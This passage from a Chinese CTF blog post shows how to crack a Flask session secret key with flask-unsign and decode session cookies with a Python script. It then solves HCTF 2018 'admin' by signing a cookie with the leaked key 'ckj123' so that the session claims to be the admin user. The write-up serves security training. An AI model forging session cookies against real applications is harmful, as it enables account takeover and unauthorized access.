+<p>&#x7206;&#x7834;key</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie  &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6Imd1ZXN0In0.Xm2ZFg.-quLR22o3jUH0PzdlVtj4m4Aecg&quot;</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="&#x65B9;&#x6CD5;2&#xFF1A;&#x4F7F;&#x7528;&#x811A;&#x672C;"><a href="#&#x65B9;&#x6CD5;2&#xFF1A;&#x4F7F;&#x7528;&#x811A;&#x672C;" class="headerlink" title="&#x65B9;&#x6CD5;2&#xFF1A;&#x4F7F;&#x7528;&#x811A;&#x672C;"></a>&#x65B9;&#x6CD5;2&#xFF1A;&#x4F7F;&#x7528;&#x811A;&#x672C;</h4><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line"><span class="hljs-keyword">import</span> zlib</span><br><span class="line"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode</span><br><span class="line"><span class="hljs-keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">3</span>: <span class="hljs-comment"># &lt; 3.0</span></span><br><span class="line">    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Must be using at least Python 3&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">elif</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span></span><br><span class="line">    <span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Lib for argument parsing</span></span><br><span class="line"><span class="hljs-keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># external Imports</span></span><br><span class="line"><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MockApp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, secret_key</span>):</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.version_info[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.version_info[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">4</span>: <span class="hljs-comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FSCM</span>(<span class="hljs-params">metaclass=ABCMeta</span>):</span></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] {}&quot;</span>.<span class="hljs-built_in">format</span>(e)</span><br><span class="line">                <span class="hljs-keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):</span></span><br><span class="line">            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):</span><br><span class="line">                    compressed = <span class="hljs-literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&apos;.&apos;</span>):</span><br><span class="line">                        compressed = <span class="hljs-literal">True</span></span><br><span class="line">                        payload = payload[<span class="hljs-number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="hljs-keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">return</span> data</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] {}&quot;</span>.<span class="hljs-built_in">format</span>(e)</span><br><span class="line">                <span class="hljs-keyword">raise</span> e</span><br><span class="line"><span class="hljs-keyword">else</span>: <span class="hljs-comment"># &gt; 3.4</span></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FSCM</span>(<span class="hljs-params">ABC</span>):</span></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="hljs-string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="hljs-built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Encoding error] {}&quot;</span>.<span class="hljs-built_in">format</span>(e)</span><br><span class="line">                <span class="hljs-keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">session_cookie_value, secret_key=<span class="hljs-literal">None</span></span>):</span></span><br><span class="line">            <span class="hljs-string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span>(secret_key==<span class="hljs-literal">None</span>):</span><br><span class="line">                    compressed = <span class="hljs-literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">&apos;.&apos;</span>):</span><br><span class="line">                        compressed = <span class="hljs-literal">True</span></span><br><span class="line">                        payload = payload[<span class="hljs-number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="hljs-keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">return</span> data</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[Decoding error] {}&quot;</span>.<span class="hljs-built_in">format</span>(e)</span><br><span class="line">                <span class="hljs-keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(FSCM.decode(<span class="hljs-string">&quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y&quot;</span>))</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="2.png" alt="img"></p>
+<h4 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h4><p>flask session &#x52A0;&#x89E3;&#x5BC6;&#x5DE5;&#x5177;&#xFF1A;<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>SECRET_KEY &#x7206;&#x7834;&#x5DE5;&#x5177;:<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
+<h3 id="&#x4E94;&#x3001;-HCTF-2018-admin"><a href="#&#x4E94;&#x3001;-HCTF-2018-admin" class="headerlink" title="&#x4E94;&#x3001;[HCTF 2018]admin"></a>&#x4E94;&#x3001;[HCTF 2018]admin</h3><p>&#x6709;&#x4E00;&#x4E2A;&#x6CE8;&#x518C;&#x754C;&#x9762;</p>
+<p><img src="4.png" alt="img"></p>
+<p>&#x6211;&#x4EEC;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st4ck</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123qwe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x7684;&#x8D26;&#x53F7;&#xFF0C;&#x7136;&#x540E;session&#x89E3;&#x5BC6;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="hljs-number">38138</span>\Desktop&gt;flask-unsign --decode --cookie <span class="hljs-string">&quot;.eJw9kEGLwjAQhf_KkrOHNtaL4GGX1mBhJlRSQ-Yibq22iXGhVagR__sGF_YwpzfvmzfvyfanoR07trwN93bG9v2RLZ_s45stGaiaS00dCfMgv-viOLKlB2-C1NVE-WZOAjIpSkd5aY1eXyBsFlIXKYqdx5wcKbRkPzOpHCfVpKQ2E-RowRcLE1wGAeZojz3wnUNecxPvyBwSFOtOiopL1cQMdQIaHSo3kS57UFsHNu5Y7I0vONpqxV4z1ozDaX_7ce31_wUUeCFLF1TnCfMqWiCR6uhRw0Sq7CA0D7ImRoBA6stjKFKqVm9c7w_n9p_Urrdlff5TrgcfBTbessaxGbuP7fDujaUJe_0C4HFsfw.Xbn_9Q.LN7SQgH0-wJ_7nD5E8h8KRKXEKM&quot;</span></span><br><span class="line">{<span class="hljs-string">&apos;_fresh&apos;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&apos;_id&apos;</span>: <span class="hljs-string">b&apos;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&apos;</span>, <span class="hljs-string">&apos;csrf_token&apos;</span>: <span class="hljs-string">b&apos;4cef6e58144463497f5c1e2a372f67633e0f715e&apos;</span>, <span class="hljs-string">&apos;image&apos;</span>: <span class="hljs-string">b&apos;xTIR&apos;</span>, <span class="hljs-string">&apos;name&apos;</span>: <span class="hljs-string">&apos;st4ck&apos;</span>, <span class="hljs-string">&apos;user_id&apos;</span>: <span class="hljs-string">&apos;10&apos;</span>}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5728;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x7684;&#x5730;&#x65B9;&#x83B7;&#x5F97;github&#x5730;&#x5740;<br><code>https://github.com/woadsl1234/hctf_flask/</code><br>&#x5728;config.py&#x91CC;&#x83B7;&#x5F97;<code>SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;</code><br>&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x62FF;&#x7740;ckj123&#x6765;&#x4F2A;&#x9020;</p>
+<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="hljs-number">38138</span>\Desktop&gt;flask-unsign --sign --cookie <span class="hljs-string">&quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&apos;, &apos;csrf_token&apos;: b&apos;4cef6e58144463497f5c1e2a372f67633e0f715e&apos;, &apos;image&apos;: b&apos;xTIR&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</span> --secret <span class="hljs-string">&quot;ckj123&quot;</span></span><br><span class="line">.eJw9kEGLwjAQhf_KkrOHNupF8LBLa7AwEyqpIXMRbattYlyoCjXif9_ggoc5vXnfvHlPtjsO7bVji9twbyds1zds8WRfB7ZgoCouNXUkzIP8tovjyBYevAlSlyNl6ykJmElROMoKa_TqDGE9lzpPUWw9ZuRIoSX7PZPKcVJ1Smo9QoYWfD43wc0gwBRt0wPfOuQVN_GOzCBBseqkKLlUdcxQJaDRoXIj6aIHtXFg447F3vicoy2X7DVh9XU47m6_rr18XkCBZ7J0RnUaMSujBRKpGo8aRlJFB6F-kDUxAgRSPx5DnlK5fON6vz-1H1K72hTV6V-57H0U2L7x_YVN2P3aDu_eWJqw1x_isWyf.XboBVw.SUcm9Kffci1R5O3u9w-lcq21QMo</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4FEE;&#x6539;cookie&#x4E2D;&#x7684;session&#x503C;&#x540E;&#x76F4;&#x63A5;&#x5C31;&#x62FF;&#x5230;&#x4E86;flag</p>
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/11/19/64%E4%BD%8Delf%E7%9A%84ret2libc/">64位elf的ret2libc</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/11/19/flask%E5%88%B0SSTI/">从flask到SSTI</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
